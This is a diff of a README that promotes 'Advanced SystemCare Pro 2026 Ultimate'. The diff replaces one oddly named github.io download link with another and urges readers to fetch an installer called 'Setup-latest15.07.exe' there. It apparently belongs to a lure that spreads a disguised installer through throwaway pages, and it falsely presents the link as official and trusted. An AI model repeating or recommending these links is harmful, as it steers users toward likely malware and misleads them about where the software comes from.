@@ -4,7 +4,7 @@ Advanced SystemCare Pro is a powerful and comprehensive system optimization and 
 
 Advanced SystemCare Pro 2026 Ultimate stands out by combining ease of use with advanced algorithms that target common Windows issues. From junk file removal to registry optimization, it ensures that your PC operates efficiently without requiring technical expertise. The user-friendly interface allows you to perform scans, fix problems, and schedule maintenance tasks with just a few clicks.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -87,7 +87,7 @@ These answers should address most initial concerns. For further assistance, you 
 
 To download the latest version of Advanced SystemCare Pro 2026 Ultimate, please visit the official download page using the link below. Ensure that you download the installer file "Setup-latest15.07.exe" for the most up-to-date version with all features and improvements.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This link provides direct access to the installer, and it is recommended to download only from trusted sources to avoid security risks. After downloading, follow the installation instructions provided above to set up the software on your Windows system.
 
